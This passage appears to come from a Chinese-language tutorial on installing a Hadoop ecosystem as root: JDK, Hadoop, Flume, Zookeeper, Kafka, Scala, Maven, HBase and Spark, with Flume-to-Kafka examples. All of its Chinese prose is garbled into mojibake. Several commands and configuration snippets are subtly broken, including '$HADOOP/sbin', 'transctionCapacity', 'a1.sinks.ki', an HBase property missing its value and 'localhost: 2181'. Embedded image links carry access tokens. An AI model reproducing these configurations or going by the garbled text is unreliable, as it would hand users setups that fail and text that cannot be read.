å››.å®‰è£…jdk\n1.è§£å‹\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# tar -zxvf jdk-8u11-linux-x64.tar.gz\n```\n2.åˆ†å‘ç»™å…¶ä½™å­èŠ‚ç‚¹\n```bash\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/\n```\n3.é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# gedit /root/.bashrc \n```\né…ç½®å¦‚ä¸‹\n```bash\n#JAVA_HOME\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\nexport PATH=$JAVA_HOME/bin:$PATH\n```\nåˆ†å‘ç»™å…¶ä»–èŠ‚ç‚¹,ä¹Ÿå¯ä»¥ç›´æ¥é…ç½®\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave2:/root/\n```\n4.åˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# source /root/.bashrc \n```\n5.æµ‹è¯•\nå¦‚ä¸‹å›æ˜¾åˆ™è¡¨ç¤ºæˆåŠŸ\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# java -version\njava version \"1.8.0_11\"\nJava(TM) SE Runtime Environment (build 1.8.0_11-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)\n```\n### äº”.å®‰è£…hadoop\n1.è§£å‹\n```bash\nroot@master:~/software/hadoop# tar -zxvf hadoop-2.7.3.tar.gz\n```\n2.é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software/hadoop# gedit /root/.bashrc \n```\né…ç½®å¦‚ä¸‹\n```bash\n#HADOOP_HOME\nexport HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3\nexport PATH=$HADOOP_HOME/bin:$HADOOP/sbin:$PATH\n```\nåˆ†å‘ç»™å­èŠ‚ç‚¹\n```bash\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave2:/root/\n```\nåˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software/hadoop# source /root/.bashrc \n```\n3.åˆ›å»ºhadoopdataç›®å½•\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3# mkdir hadoopdata\n```\n4.é…ç½®hadoop-env.shæ–‡ä»¶\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cd etc/hadoop/\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hadoop-env.sh \n```\n```bash\næ‰¾åˆ°\nexport JAVA_HOME=${JAVA_HOME}\nä¿®æ”¹ä¸º\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n5.é…ç½®yarn-env.sh\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-env.sh \n```\n```bash\næ‰¾åˆ°\n#export JAVA_HOME=/home/y/libexec/jdk1.6.0/\nä¿®æ”¹ä¸º\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n6.é…ç½®æ ¸å¿ƒç»„ä»¶core-site.xml \n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit core-site.xml \n```\n```xml\n<configuration>\n<property>\n<name>fs.defaultFS</name>\n<value>hdfs://master:9000</value>\n</property>\n<property>\n<name>hadoop.tmp.dir</name>\n<value>/root/software/hadoop/hadoop-2.7.3/hadoopdata</value>\n</property>\n</configuration>\n```\n7.é…ç½®é…ç½®æ–‡ä»¶ç³»ç»Ÿhdfs-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hdfs-site.xml \n```\n```xml\n<configuration>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.rpc-address</name>\n\t\t<value>master:50071</value>\n\t</property>\n</configuration>\n```\n8.é…ç½®æ–‡ä»¶ç³»ç»Ÿyarn-site.xm\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-site.xml\n```\n```xml\n<configuration>\n<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n                <name>yarn.resourcemanager.address</name>\n                <value>master:18040</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.scheduler.address</name>\n                <value>master:18030</value>\n        </property>\n\t<property>\n                <name>yarn.resourcemanager.resource-tracker.address</name>\n                <value>master:18025</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.admin.address</name>\n                <value>master:18141</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.webapp.address</name>\n                <value>master:18088</value>\n        </property>\n\n</configuration>\n```\n9.é…ç½®è®¡ç®—æ¡†æ¶mapred-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cp mapred-site.xml.template mapred-site.xml\n\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit mapred-site.xml\n```\n```xml\n<configuration>\n<property>\n<name>mapreduce.framework.name</name>\n<value>yarn</value>\n</property>\n</configuration>\n```\n10.é…ç½®slavesæ–‡ä»¶\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit slaves \n```\n```bash\nmaster\nslave1\nslave2\n```\n11.åˆ†å‘ç»™å­èŠ‚ç‚¹\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/\n```\n12.æ ¼å¼åŒ–namanode\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# hdfs namenode -format\n```\n13.å¯åŠ¨hadoop\n```bash\nè¿›å…¥sbinç›®å½•ä¸‹æ‰§è¡Œ\n\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# ./start-all.sh \n\næ‰§è¡Œå‘½ä»¤åï¼Œæç¤ºå‡ºå…¥yes/noæ—¶ï¼Œè¾“å…¥yesã€‚\n```\n14.æµ‹è¯•\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n```\næœ‰ä»¥ä¸‹è¿›ç¨‹è¡¨ç¤ºæ­å»ºæˆåŠŸ!\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n4848 SecondaryNameNode\n4999 ResourceManager\n4489 NameNode\n4650 DataNode\n5423 Jps\n5135 NodeManager\n```\n15.webç«¯æŸ¥çœ‹\n```bash\nåœ¨Masterä¸Šå¯åŠ¨Firefoxæµè§ˆå™¨ï¼Œåœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥è¾“å…¥http://master:50070/,æœ‰å¦‚ä¸‹å›æ˜¾è¡¨ç¤ºæˆåŠŸ\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151354214.png?token=ARYCSATWRJAZNISFMK2R4I3CQCK5S)\n```bash\nåœ¨Masterä¸Šå¯åŠ¨Firefoxæµè§ˆå™¨ï¼Œåœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥è¾“å…¥http://master:18088/ï¼Œæ£€æŸ¥ Yarnæ˜¯å¦æ­£å¸¸ï¼Œé¡µé¢å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151354984.png?token=ARYCSAVJG5SWWAXSUBPQ7UDCQCK7C)\n### å…­.flumeå®‰è£…ä¸é…ç½®\n\n1.è§£å‹\n```bash\ntar -zxvf apache-flume-1.7.0-bin.tar.gz \n```\n2.é…ç½®ç¯å¢ƒå˜é‡\n```bash\n#FLUME_HOME\nexport FLUME_HOME=/root/software/flume-1.7.0\nexport PATH=$FLUME_HOME/bin:$PATH\n```\n3.å¤åˆ¶é…ç½®æ–‡ä»¶\n```bash\ncp flume-env.sh.template flume-env.sh\n```\nä¿®æ”¹\n```bash\n# export JAVA_HOME=/usr/lib/jvm/java-6-sun\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n4.é…ç½®é…ç½®æ–‡ä»¶\n```bash\nsource: æ•°æ®çš„å…¥å£,è§„å®šäº†æ•°æ®æ”¶é›†çš„å…¥å£è§„èŒƒ\nchannel: ç®¡é“,å­˜å‚¨æ•°æ®ç”¨çš„\nskin: æ•°æ®çš„å‡ºå£,è§„å®šäº†æ•°æ®æ”¶é›†çš„å‡ºå£è§„èŒƒ\nagent: ä¸€ä¸ªä»»åŠ¡,åŒ…å«äº†source,channel,skin\n\n```\n\n```bash\ncp flume-conf.properties.template flume-conf.properties\n```\nä¿®æ”¹ä¸º\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n# Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n5.å¯åŠ¨\n```bash\n./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console\n```\n6.ncæµ‹è¯•\n```bash\nnc localhost 44444\n```\n7.æ¡ˆä¾‹ä¸€\nç›‘å¬æ–‡ä»¶å†…å®¹å˜åŠ¨ï¼Œå°†æ–°å¢åŠ çš„å†…å®¹è¾“å‡ºåˆ°æ§åˆ¶å°ã€‚\næ–°å»ºé…ç½®æ–‡ä»¶ exec-memory-logger.properties,å…¶å†…å®¹å¦‚ä¸‹ï¼š\n```bash\n#æŒ‡å®šagentçš„sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#é…ç½®sourceså±æ€§\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\n\n#å°†sourcesä¸channelsè¿›è¡Œç»‘å®š\na1.sources.s1.channels = c1\n   \n#é…ç½®sink \na1.sinks.k1.type = logger\n\n#å°†sinksä¸channelsè¿›è¡Œç»‘å®š  \na1.sinks.k1.channel = c1  \n   \n#é…ç½®channelç±»å‹\na1.channels.c1.type = memory\n```\n8.æ¡ˆä¾‹äºŒ\nç›‘å¬æŒ‡å®šç«¯å£,å°†è¿™ä¸ªå‘è¿™ä¸ªç«¯å£å†™å…¥çš„æ•°æ®è¾“å‡ºåˆ°æ§åˆ¶å°\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = 192.168.32.130\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transctionCapacity = 100\n\n#Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n9.æ¡ˆä¾‹ä¸‰\nç›‘å¬æŒ‡å®šç›®å½•ï¼Œå°†ç›®å½•ä¸‹æ–°å¢åŠ çš„æ–‡ä»¶å­˜å‚¨åˆ° HDFSã€‚\næ–°å»ºé…ç½®æ–‡ä»¶spooling-memory-hdfs.properties\n```bash\n#æŒ‡å®šagentçš„sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#é…ç½®sourceså±æ€§\na1.sources.s1.type =spooldir  \na1.sources.s1.spoolDir =/tmp/logs\na1.sources.s1.basenameHeader = true\na1.sources.s1.basenameHeaderKey = fileName \n#å°†sourcesä¸channelsè¿›è¡Œç»‘å®š  \na1.sources.s1.channels =c1 \n\n   \n#é…ç½®sink \na1.sinks.k1.type = hdfs\na1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/\na1.sinks.k1.hdfs.filePrefix = %{fileName}\n#ç”Ÿæˆçš„æ–‡ä»¶ç±»å‹ï¼Œé»˜è®¤æ˜¯Sequencefileï¼Œå¯ç”¨DataStreamï¼Œåˆ™ä¸ºæ™®é€šæ–‡æœ¬\na1.sinks.k1.hdfs.fileType = DataStream  \na1.sinks.k1.hdfs.useLocalTimeStamp = true\n#å°†sinksä¸channelsè¿›è¡Œç»‘å®š  \na1.sinks.k1.channel = c1\n   \n#é…ç½®channelç±»å‹\na1.channels.c1.type = memory\n```\n\n10.æ¡ˆä¾‹å››\nå°†æœ¬æœåŠ¡å™¨æ”¶é›†åˆ°çš„æ•°æ®å‘é€åˆ°å¦å¤–ä¸€å°æœåŠ¡å™¨ã€‚\næ–°å»ºé…ç½® netcat-memory-avro.propertiesï¼Œç›‘å¬æ–‡ä»¶å†…å®¹å˜åŒ–ï¼Œç„¶åå°†æ–°çš„æ–‡ä»¶å†…å®¹é€šè¿‡ avro sink å‘é€åˆ° hadoop001 è¿™å°æœåŠ¡å™¨çš„ 8888 ç«¯å£ï¼š\n```bash\n#æŒ‡å®šagentçš„sources,sinks,channels\na1.sources = s1\na1.sinks = k1\na1.channels = c1\n\n#é…ç½®sourceså±æ€§\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\na1.sources.s1.channels = c1\n\n#é…ç½®sink\na1.sinks.k1.type = avro\na1.sinks.k1.hostname = hadoop001\na1.sinks.k1.port = 8888\na1.sinks.k1.batch-size = 1\na1.sinks.k1.channel = c1\n\n#é…ç½®channelç±»å‹\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n```\né…ç½®æ—¥å¿—èšåˆFlume\nä½¿ç”¨ avro source ç›‘å¬ hadoop001 æœåŠ¡å™¨çš„ 8888 ç«¯å£ï¼Œå°†è·å–åˆ°å†…å®¹è¾“å‡ºåˆ°æ§åˆ¶å°\n```bash\n#æŒ‡å®šagentçš„sources,sinks,channels\na2.sources = s2\na2.sinks = k2\na2.channels = c2\n\n#é…ç½®sourceså±æ€§\na2.sources.s2.type = avro\na2.sources.s2.bind = hadoop001\na2.sources.s2.port = 8888\n\n#å°†sourcesä¸channelsè¿›è¡Œç»‘å®š\na2.sources.s2.channels = c2\n\n#é…ç½®sink\na2.sinks.k2.type = logger\n\n#å°†sinksä¸channelsè¿›è¡Œç»‘å®š\na2.sinks.k2.channel = c2\n\n#é…ç½®channelç±»å‹\na2.channels.c2.type = memory\na2.channels.c2.capacity = 1000\na2.channels.c2.transactionCapacity = 100\n\n```\nè¿™é‡Œå»ºè®®å…ˆå¯åŠ¨a2ï¼ŒåŸå› æ˜¯ avro.source ä¼šå…ˆä¸ç«¯å£è¿›è¡Œç»‘å®šï¼Œè¿™æ · avro sink è¿æ¥æ—¶æ‰ä¸ä¼šæŠ¥æ— æ³•è¿æ¥çš„å¼‚å¸¸ã€‚ä½†æ˜¯å³ä½¿ä¸æŒ‰é¡ºåºå¯åŠ¨ä¹Ÿæ˜¯æ²¡å…³ç³»çš„ï¼Œsink ä¼šä¸€ç›´é‡è¯•ï¼Œç›´è‡³å»ºç«‹å¥½è¿æ¥ã€‚\n\n### ä¸ƒ.Zookeeperå®‰è£…é…ç½®\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\n#ZOOKEEPER_HOME\nexport ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0\nexport PATH=$ZOOKEEPER_HOME/bin:$PATH\n```\n\n2.æ–°å»ºä¸€ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ•°æ®\n```bash\nmkdir /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n3.ç¼–è¾‘é…ç½®æ–‡ä»¶\nå¤åˆ¶ä¸€ä»½é…ç½®æ–‡ä»¶,å¹¶æ›¿æ¢å†…å®¹\n```bash\ncp zoo_sample.cfg zoo.cfg\n```\n```bash\ndataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n4.å¯åŠ¨\n```bash\n ./zkServer.sh start\n```\n\n### å…«.kafkaå®‰è£…é…ç½®ä¸ä½¿ç”¨\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\n#KAFKA_HOME\nexport KAFKA_HOME=/root/software/kafka_2.11-2.0.0\nexport PATH=$KAFKA_HOME/bin:$PATH\n```\n2.åˆ›å»ºæ—¥å¿—æ–‡ä»¶å¤¹\n```bash\nmkdir /root/software/kafka_2.11-2.0.0/kafka-logs\n```\n3.configæ–‡ä»¶å¤¹ä¸­ä¿®æ”¹é…ç½®æ–‡ä»¶ä»¥ä¸‹å‡ é¡¹\n```bash\ngedit server.properties \n```\n```bash\nlog.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs\n\nlisteners=PLAINTEXT://localhost:9092\n```\n4.å¯åŠ¨kafka\nå¯åŠ¨kafkaä¹‹å‰è¦å…ˆå¯åŠ¨zookeeper\n```bash\n kafka-server-start.sh ./config/server.properties\n```\n5.åˆ›å»ºtopicä¸»é¢˜\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1\n```\n6.æŸ¥çœ‹\n```bash\n kafka-topics.sh --list --zookeeper localhost:2181\n```\n7.ç”Ÿäº§æ¶ˆæ¯\n```bash\n kafka-console-producer.sh --broker-list localhost:9092 --topic topic-demo\n```\n8.æ¶ˆè´¹æ¶ˆæ¯\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo\n--beginning å¯é€‰å‚æ•°,ä»£è¡¨ä»å¤´æ¶ˆè´¹\n```\n9.æŸ¥çœ‹æ‰€æœ‰topicçš„ä¿¡æ¯\n```bash\nkafka-topics.sh --zookeeper localhost: 2181 --describe \n--topic topic-demo å¯é€‰å‚æ•°,è¡¨ç¤ºæŒ‡å®štopic\n```\n10.å•èŠ‚ç‚¹å¤šbroker\n\n* ä¿®æ”¹é…åˆæ–‡ä»¶ä¸­çš„id,ç«¯å£,æ—¥å¿—æ–‡ä»¶å¤¹\n* å¯åŠ¨\n```bash\nkafka-server-start.sh --deamon ./config/server.properties &\nkafka-server-start.sh --deamon ./config/server2.properties &\nkafka-server-start.sh --deamon ./config/server3.properties &\n```\n* å¤šå‰¯æœ¬\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1\n```\n\n### ä¹.å®‰è£…scala\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software/scala-2.11.0# tar -zxvf scala-2.11.0.tgz \nroot@ubuntu:~/software/scala-2.11.0# gedit /root/.bashrc \n```\n```bash\n#SCALA_HOME\nexport SCALA_HOME=/root/software/scala-2.11.0\nexport PATH=$SCALA_HOME/bin:$PATH\n```\n2.åˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.æµ‹è¯•\n```bash\nroot@ubuntu:~/software/scala-2.11.0# scala\nWelcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).\nType in expressions to have them evaluated.\nType :help for more information.\n\nscala> \n```\n\n### å.å®‰è£…maven\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software# tar -zxvf apache-maven-3.8.5-bin.tar.gz\nroot@ubuntu:~/software# mv apache-maven-3.8.5 maven-3.8.5\nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#MAVEN_HOME\nexport MAVEN_HOME=/root/software/maven-3.8.5\nexport PATH=$MAVEN_HOME/bin:$PATH\n```\n2.åˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.æµ‹è¯•\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mvn -v\nApache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)\nMaven home: /root/software/maven-3.8.5\nJava version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"5.4.0-100-generic\", arch: \"amd64\", family: \"unix\"\n```\n4.ä¿®æ”¹jaråŒ…å­˜æ”¾ä½ç½®\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mkdir maven-repos\nroot@ubuntu:~/software/maven-3.8.5# gedit conf/settings.xml \n```\næ·»åŠ ä¸€è¡Œ\n```xml\n<localRepository>/root/software/maven-3.8.5/maven-repos</localRepository>\n```\n\n### åä¸€.Hbaseå®‰è£…\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software# tar -zxvf hbase-1.2.0-bin.tar.gz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#HBASE_HOME\nexport HBASE_HOME=/root/software/hbase-1.2.0\nexport PATH=$HBASE_HOME/bin:$PATH\n```\n2.åˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.ç¼–è¾‘é…ç½®æ–‡ä»¶\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-env.sh\n```\nä¿®æ”¹\n```bash\n#export JAVA_HOME=/usr/java/jdk1.6.0/\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\nä¿®æ”¹\n```bash\n# export HBASE_MANAGES_ZK=true\nexport HBASE_MANAGES_ZK=false\n```\næ·»åŠ \n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-site.xml \n```\n```xml\n<configuration>\n        <property>\n                <name>hbase.cluster.distributed</name>\n        </property>\n        <property>\n                <name>hbase.rootdir</name>\n                <value>hdfs://master:9000/hbase</value>\n        </property>\n        <property>\n                <name>hbase.zookeeper.quorum</name>\n                <value>master</value>\n        </property>\n        <property>\n                <name>hbase.master.info.port</name>\n                <value>60010</value>\n        </property>\n</configuration>\n```\nä¿®æ”¹\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit regionservers \n```\nä¸º\n```bash\nmaster\n```\n4.å¯åŠ¨hbase\né¦–å…ˆè¦å…ˆå¯åŠ¨zeekeeper\n```bash\nroot@master:~/software# zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... STARTED\n```\n```bash\nroot@master:~/software# start-hbase.sh \nstarting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\nmaster: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\n```\n```bash\nroot@master:~/software/hbase-1.2.0/bin# jps\n2992 SecondaryNameNode\n4514 QuorumPeerMain\n3282 NodeManager\n6196 HRegionServer\n3143 ResourceManager\n6026 HMaster\n6330 Jps\n2636 NameNode\n2796 DataNode\n```\nè®¿é—®\n```url\nhttp://master:60010\n```\n\n6.æµ‹è¯•\n```bash\nroot@master:~/software/hbase-1.2.0/bin# hbase shell\n\nhbase(main):001:0> version\n1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016\n```\n\n### åäºŒ.Sparkå®‰è£…\n1.è§£å‹å¹¶é…ç½®ç¯å¢ƒå˜é‡\n```bash\nroot@master:~/software# tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#SPARK_HOME\nexport SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7\nexport PATH=$SPARK_HOME/bin:$PATH\n```\n2.åˆ·æ–°ç¯å¢ƒå˜é‡\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.æµ‹è¯•\n```bash\nroot@master:~/software/spark-2.1.1-bin-hadoop2.7# spark-shell --version\nWelcome to\n      ____              __\n     / __/__  ___ _____/ /__\n    _\\ \\/ _ \\/ _ `/ __/  '_/\n   /___/ .__/\\_,_/_/ /_/\\_\\   version 2.1.1\n      /_/\n                        \nUsing Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11\nBranch \nCompiled by user jenkins on 2017-04-25T23:51:10Z\nRevision \nUrl \nType --help for more information.\n\n```\n### åä¸‰.flumeå¯¹æ¥kafka\nä¸€èˆ¬flumeé‡‡é›†çš„æ–¹å¼æœ‰ä¸¤ç§\n1.Execç±»å‹çš„Source\nå¯ä»¥å°†å‘½ä»¤äº§ç”Ÿçš„è¾“å‡ºä½œä¸ºæºï¼Œå¦‚ï¼š\n```bashh\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt //æ­¤å¤„è¾“å…¥å‘½ä»¤\n```\n2.Spooling Directoryç±»å‹çš„ Source\nå°†æŒ‡å®šçš„æ–‡ä»¶åŠ å…¥åˆ°â€œè‡ªåŠ¨æœé›† â€ç›®å½•ä¸­ã€‚flumeä¼šæŒç»­ç›‘å¬è¿™ä¸ªç›®å½•ï¼ŒæŠŠæ–‡ä»¶å½“åšsourceæ¥å¤„ç†ã€‚æ³¨æ„ï¼šä¸€æ—¦æ–‡ä»¶è¢«æ”¾åˆ°â€œè‡ªåŠ¨æ”¶é›†â€ç›®å½•ä¸­åï¼Œä¾¿ä¸èƒ½ä¿®æ”¹ï¼Œå¦‚æœä¿®æ”¹ï¼Œflumeä¼šæŠ¥é”™ã€‚æ­¤å¤–ï¼Œä¹Ÿä¸èƒ½æœ‰é‡åçš„æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œflumeä¹Ÿä¼šæŠ¥é”™ã€‚\n```bash\na1.sources.r1.type = spooldir\na1.sources.r1.spoolDir = /home/work/data\n```\n#### 1.flumeé‡‡é›†æŸæ—¥å¿—æ–‡ä»¶åˆ°kafkaè‡ªå®šä¹‰topic\n1.1 åˆ›å»ºflumeé…ç½®æ–‡ä»¶ flume-kafka-file.conf\n```bash\n# å®šä¹‰è¿™ä¸ªagentä¸­å„ç»„ä»¶çš„åå­—\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# æè¿°å’Œé…ç½®sourceç»„ä»¶ï¼šr1\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt\n \n# æè¿°å’Œé…ç½®sinkç»„ä»¶ï¼šk1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# æè¿°å’Œé…ç½®channelç»„ä»¶ï¼Œæ­¤å¤„ä½¿ç”¨æ˜¯å†…å­˜ç¼“å­˜çš„æ–¹å¼\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# æè¿°å’Œé…ç½®source  channel   sinkä¹‹é—´çš„è¿æ¥å…³ç³»\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n1.2 å¯åŠ¨zookeeperå’Œkafka\n```bash\n./zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... already running as process 5452.\n```\n```bash\nkafka-server-start.sh ./config/server.properties\n```\n1.3 åˆ›å»ºtopic\n\ntopic:æŒ‡å®štopic name\n\npartitions:æŒ‡å®šåˆ†åŒºæ•°ï¼Œè¿™ä¸ªå‚æ•°éœ€è¦æ ¹æ®brokeræ•°å’Œæ•°æ®é‡å†³å®šï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œæ¯ä¸ªbrokerä¸Šä¸¤ä¸ªpartitionæœ€å¥½\n\nreplication-factor:å‰¯æœ¬æ•°ï¼Œå»ºè®®è®¾ç½®ä¸º2\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1\n```\n1.4 å¯åŠ¨kafkaå»æ¶ˆè´¹topic\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2\n--from-beginning å¯é€‰å‚æ•°,ä»£è¡¨ä»å¤´æ¶ˆè´¹\n```\n1.5 å¯åŠ¨flume\n```bash\n./bin/flume-ng agent -n a1 -c ./conf/ -f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console\n```\n1.6 å‘æ—¥å¿—æ–‡ä»¶/tmp/log.txtå†™å…¥ä¸€äº›æ•°æ®\n```bash\necho '123' >> /tmp/log.txt\n```\nå°±å¯ä»¥åœ¨æ¶ˆè´¹è€…çª—å£çœ‹åˆ°è¾“å‡º\n\n\n\n#### 